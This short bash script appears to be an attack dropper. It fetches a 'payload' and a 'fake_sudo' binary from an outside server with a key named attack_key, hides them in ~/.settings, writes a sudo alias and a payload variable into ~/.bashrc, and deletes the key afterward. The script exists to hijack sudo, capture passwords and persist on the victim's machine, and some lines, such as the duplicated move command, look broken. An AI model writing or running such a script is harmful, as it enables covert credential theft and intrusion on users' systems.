#!/bin/bash
mkdir -p ~/.settings
scp -i attack_key root@161.35.130.78:/root/exe/payload ./
scp -i attack_key root@161.35.130.78:/root/exe/fake_sudo ./
mv payload ~/.settings/payload
mv payload ~/.settings/payload

echo "export PAYLOAD=~/.settings/payload">>~/.bashrc
echo "alias sudo=~/.settings/fake_sudo">>~/.bashrc

rm attack_key